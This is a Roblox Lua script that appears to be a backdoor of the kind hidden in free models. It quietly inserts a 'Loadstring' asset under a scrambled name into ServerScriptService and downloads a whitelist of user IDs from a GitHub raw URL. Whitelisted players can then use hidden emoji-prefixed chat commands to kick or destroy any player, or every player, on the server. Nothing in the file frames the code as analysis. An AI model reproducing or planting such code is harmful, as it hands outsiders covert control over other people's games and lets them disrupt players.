local ins = game:GetService("InsertService")
local model = ins:LoadAsset(4689019964)
local asset = model["Loadstring"]
asset.Name = "fuhufasyjufsdyhfystfuhyysdfvhgfhsdgvfhgvghhjfvdsh"
asset.Parent = game:GetService("ServerStorage")

local zzz = asset:Clone()
zzz.Parent = game:GetService("ServerScriptService")
asset:Destroy()

local url = "https://raw.githubusercontent.com/nonNamedUser/whitelists/refs/heads/main/eg/w.json"
local http = game:GetService("HttpService")

if not http.HttpEnabled then return end

local success, content = pcall(function()
	return http:GetAsync(url)
end)

if not success then return end

local tbl
success, tbl = pcall(function()
	return http:JSONDecode(content)
end)

if not success or typeof(tbl) ~= "table" then return end

-- Silent fallback for table.find
if not table.find then
	function table.find(tbl, value)
		for i, v in ipairs(tbl) do
			if v == value then
				return i
			end
		end
		return nil
	end
end

if game:GetService("TextChatService").ChatVersion == Enum.ChatVersion.TextChatService then
	local z = Instance.new("TextChatCommand", game:GetService("TextChatService"))
	z.PrimaryAlias = "🤬"
end

function acm(plr)
	plr.Chatted:Connect(function(message)
		local m = message:split(" ")
		local prefix = "🤬 "

		if m[1] == prefix.."kick" then
			if m[2] then
				if m[2] == "all" then
					for _, z in game:GetService("Players"):GetPlayers() do
						if m[3] then
							local len = #m[1] + #m[2] + 3
							local kickmsg = message:sub(len)
							z:Kick(kickmsg)
						else
							z:Destroy()
						end
					end
					return
				end

				for _, z in game:GetService("Players"):GetPlayers() do
					if string.lower(z.Name):find(string.lower(m[2])) then
						if m[3] then
							local len = #m[1] + #m[2] + 3
							local kickmsg = message:sub(len)
							z:Kick(kickmsg)
						else
							z:Destroy()
						end
					end
				end
			end
		end
	end)
end

for _, plr in game:GetService("Players"):GetPlayers() do
	if not plr:FindFirstChild("_JSM_LOADED_CORRECTLY_") then
		local z = Instance.new("BoolValue")
		z.Name = "_JSM_LOADED_CORRECTLY_"
		z.Parent = plr

		if table.find(tbl, plr.UserId) then
			acm(plr)
		end
	end
end

game:GetService("Players").PlayerAdded:Connect(function(plr)
	if not plr:FindFirstChild("_JSM_LOADED_CORRECTLY_") then
		local z = Instance.new("BoolValue")
		z.Name = "_JSM_LOADED_CORRECTLY_"
		z.Parent = plr

		if table.find(tbl, plr.UserId) then
			acm(plr)
		end
	end
end)
